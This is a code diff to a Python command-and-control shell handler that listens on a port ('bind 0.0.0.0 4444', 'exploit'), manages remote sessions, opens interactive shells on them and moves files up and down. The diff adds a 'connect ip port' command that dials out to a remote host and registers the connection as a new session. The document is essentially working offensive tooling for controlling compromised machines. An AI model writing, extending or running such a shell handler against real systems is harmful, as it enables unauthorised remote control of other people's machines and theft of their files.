@@ -2,7 +2,7 @@
 some doc will be here
 '''
 import subprocess
-from socket import socket
+import socket
 from threading import Thread
 from time import sleep
 import os
@@ -106,6 +106,7 @@ def showhelp():
  exploit
  sessions
  bind 0.0.0.0 4444
+ connect ip port
  ----------------for-shell-------------------- 
  up src dst
  down src dst
@@ -113,7 +114,7 @@ def showhelp():
 
 def exploit():
     global idx, sessions
-    server = socket()
+    server = socket.socket()
     server.bind((host, port))
     server.listen(1024)
 
@@ -139,7 +140,6 @@ def pingtest(session_id, sock):
 if __name__ == '__main__':
                                  
     print('''\n\t._ _    _.  ._   _|_  o   _ \n\t| | |  (_|  | |   |_  |  _> \n\n''')
- 
  
     while True:       
         opts = input(prompt).split(' ')
@@ -183,25 +183,40 @@ if __name__ == '__main__':
                     host = opts[1]
                     port = int(opts[2])
 
+            elif first == 'connect':
+                if len(opts) == 3:
+                    dhost = opts[1]
+                    dport = int(opts[2])
+                    addr = (dhost, dport)
+                    client = socket.socket()
+                    client.connect(addr)
+                    Thread(target=pingtest, args=(idx,client)).start()
+                    print(f"\r[+] Session {idx} has been opened from {addr} !")
+                    session = Session(client,addr)
+                    sessions[idx] = session
+                    idx+=1
+                else: print("[-] connect ip port")
+
             elif first == 'note':
                 if len(opts) > 2:
                     sessions[int(opts[1])].note = opts[2]
-                else:
-                    print("[-] note session_id text")
+                else: print("[-] note session_id text")
 
             elif first == 'sessions':
                 if len(opts) == 2:
-                    session_id = int(opts[1])
-                    if session_id in sessions.keys():
-                        sessions[int(opts[1])].shell()
-                    else:
-                        print(f"[-] No session {session_id} !")
+                    try:
+                        session_id = int(opts[1])
+                        if session_id in sessions.keys():
+                            sessions[int(opts[1])].shell()
+                        else: print(f"[-] No session {session_id} !")
+                    except ValueError as e:
+                        print('[-] '+ str(e))
+
                 else:
                     print(f" Total: {len(sessions)} idx: {idx}")
                     for i in sessions:
                         session = sessions[i]
                         print(f" {i}\t{session.addr}\t{session.detail}\t{session.note}")
 
-            else:
-                print("[-] "+str(opts))
+            else: print("[-] "+str(opts))
                 
